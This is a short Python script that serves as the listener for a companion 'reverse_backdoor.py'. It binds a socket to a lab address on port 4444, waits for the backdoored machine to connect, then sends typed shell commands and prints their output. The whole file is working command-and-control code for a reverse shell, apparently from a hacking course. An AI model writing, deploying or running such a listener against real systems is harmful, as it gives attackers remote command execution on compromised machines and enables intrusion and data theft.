#! /usr/bin/env python
# NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
# Compatibility: Python 3 only.

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.0.2.15", 4444))
listener.listen(0)
print("[+] Waiting for incoming connection...")
connection, address = listener.accept()
print(f"[+] Connection established! Source: {address}.")

while True:
    command = input(" >> ")
    connection.send(command.encode(errors="replace"))
    result = connection.recv(1024).decode(errors="replace")
    print(result)
